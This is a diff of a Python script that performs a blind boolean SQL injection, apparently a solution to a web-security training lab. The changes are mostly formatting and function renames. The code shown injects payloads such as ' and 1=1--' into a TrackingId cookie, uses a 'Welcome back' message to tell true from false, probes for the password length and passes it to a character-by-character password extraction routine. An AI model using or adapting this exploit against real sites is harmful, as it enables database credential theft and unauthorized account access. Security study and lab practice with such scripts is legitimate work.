@@ -4,6 +4,7 @@ import urllib.parse
 
 import requests
 import urllib3
+
 # from bs4 import BeautifulSoup
 from colorama import Fore
 from requests.exceptions import RequestException
@@ -49,6 +50,7 @@ def solve_password(base_url, cookies, password_length):
 
     return password_extracted
 
+
 def find_password_length(base_url, cookies):
     password_length = 0
     for i in range(1, 50):
@@ -73,7 +75,8 @@ def find_password_length(base_url, cookies):
 
     return password_length
 
-def check_if_sqli_possible(base_url, cookies):
+
+def check_if_sqli_response_possible(base_url, cookies):
     sqli_true = "' and 1=1--'"
     sqli_false = "' and 1=2--'"
     sqli_true_encoded = urllib.parse.quote(sqli_true)
@@ -87,25 +90,22 @@ def check_if_sqli_possible(base_url, cookies):
         "TrackingId": tack_cook + sqli_true_encoded,
         "session": sess_cook,
     }
-    r = requests.get(
-        base_url, cookies=cookie, proxies=proxies, verify=False, timeout=5
-    )
+    r = requests.get(base_url, cookies=cookie, proxies=proxies, verify=False, timeout=5)
     r.raise_for_status()
     if "Welcome back" not in r.text:
-        print(f"{Fore.RED}[-] Sqli is NOT possible {Fore.RESET}")
+        print(f"{Fore.RED}[-] Sqli conditional RESPONSES is NOT possible {Fore.RESET}")
         return False
     cookie = {
         "TrackingId": tack_cook + sqli_false_encoded,
         "session": sess_cook,
     }
-    r = requests.get(
-        base_url, cookies=cookie, proxies=proxies, verify=False, timeout=5
-    )
+    r = requests.get(base_url, cookies=cookie, proxies=proxies, verify=False, timeout=5)
     r.raise_for_status()
     if "Welcome back" in r.text:
-        print(f"{Fore.RED}[-] Sqli is NOT possible {Fore.RESET}")
+        print(f"{Fore.RED}[-] Sqli conditional RESPONSES is NOT possible {Fore.RESET}")
         return False
     return True
+
 
 def get_cookies_from_url(base_url):
     try:
@@ -123,13 +123,14 @@ def get_cookies_from_url(base_url):
         print(f"An error occurred: {str(e)}")
         return None
 
+
 def exploit(base_url):
-    cookies = get_cookies_from_url(base_url) 
+    cookies = get_cookies_from_url(base_url)
     print(f"{Fore.GREEN}[+] Cookies: {cookies}{Fore.RESET}")
-    possible = check_if_sqli_possible(base_url, cookies)
+    possible = check_if_sqli_response_possible(base_url, cookies)
     if not possible:
         return
-    print(f"{Fore.GREEN}[-] Sqli is possible{Fore.RESET}")
+    print(f"{Fore.GREEN}[-] Sqli conditional RESPONSES is possible{Fore.RESET}")
     pwd_length = find_password_length(base_url, cookies)
     print(f"{Fore.GREEN}[-] Password length =  {pwd_length}{Fore.RESET}")
     if pwd_length > 0:
